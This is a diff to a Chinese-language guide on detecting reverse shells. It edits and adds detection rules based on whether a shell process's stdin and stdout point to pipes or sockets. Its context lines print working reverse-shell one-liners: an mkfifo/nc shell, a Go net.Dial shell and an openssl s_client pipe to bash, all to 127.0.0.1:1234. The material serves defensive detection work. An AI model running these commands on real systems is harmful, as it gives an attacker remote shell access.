@@ -164,9 +164,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  127.0.0.1 1234 >/tmp/f
 
 目标机执行后的结果如下：
 
-创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。
+创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。
 
-匹配规则：bash进程的0，和1文件描述符指向pipe
+匹配规则：sh进程的0，和1文件描述符指向pipe
 
 ```lua
 
@@ -194,6 +194,10 @@ p.waitFor()
 ```
 ![agent](../images/WechatIMG56.jpeg)
 
+目标机执行后的结果如下：
+
+匹配规则：某一个bash进程的0 文件描述符指向socket
+
 
 Golang
 
@@ -203,6 +207,13 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 ```
 ![agent](../images/WechatIMG64.jpeg)
+
+目标机执行后的结果如下：
+
+创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe
+
+
 
 Nodejs
 
@@ -276,9 +287,8 @@ openssl s_client -quiet -connect 127.0.0.1:1234|/bin/bash|openssl s_client -quie
 
 ![agent](../images/WeChat8872f342986ad270beb9f2cfed15620b.png)目标机执行后的结果如下：
 
-创建了一个常住进程“bash”， 它的得0和1文件描述符都指向socket。
-
-匹配规则：bash进程的0，和1文件描述符指向socket
+创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe
 
 ```bash
 
